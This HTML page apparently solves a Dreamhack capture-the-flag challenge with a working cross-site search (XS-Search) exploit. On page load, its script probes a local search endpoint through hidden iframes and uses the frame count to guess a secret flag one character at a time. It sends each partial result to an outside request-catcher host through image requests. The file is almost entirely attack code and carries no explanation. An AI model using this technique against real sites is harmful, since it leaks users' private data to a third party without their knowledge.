<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <h1>XS-Search Site</h1>

        <script>
            const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

            async function search(query) {
                return new Promise((resolve) => {
                    const ifr = document.createElement('iframe');
                    ifr.src = `http://127.0.0.1:8000/search?query=${encodeURIComponent(query)}`;
                    ifr.style.display = 'none';
                    document.body.appendChild(ifr);

                    ifr.onload = () => {
                        const found = ifr.contentWindow.length > 0;
                        document.body.removeChild(ifr);
                        resolve(found);
                    }

                    setTimeout(() => {
                        if (document.body.contains(ifr)) {
                            document.body.removeChild(ifr);
                            resolve(false);
                        }
                    }, 100);
                });
            }

            async function exploit() {
                new Image().src = `https://dgxjyvd.request.dreamhack.games?start=started`;

                let chars = "abcdefghijklmnopqrstuvwxyz0123456789_}";
                let secret = "DH{";
                let secret_length = 40;

                for (let i = 3; i < secret_length; i++) {
                    let foundAny = false;

                    for (let c of chars) {
                        await sleep(50);

                        const result = await search(secret + c);

                        if (result) {
                            secret += c;
                            new Image().src= `https://dgxjyvd.request.dreamhack.games?found=${encodeURIComponent(secret)}`;
                            console.log(`Found: ${secret}`);
                            foundAny = true;

                            if (c === "}") return;
                            break;
                        }
                    }

                    if (!foundAny) {
                        new Image().src = `https://dgxjyvd.request.dreamhack.games?error=No`;
                    }
                }
            }

            exploit();
    </script>
</body>
</html>
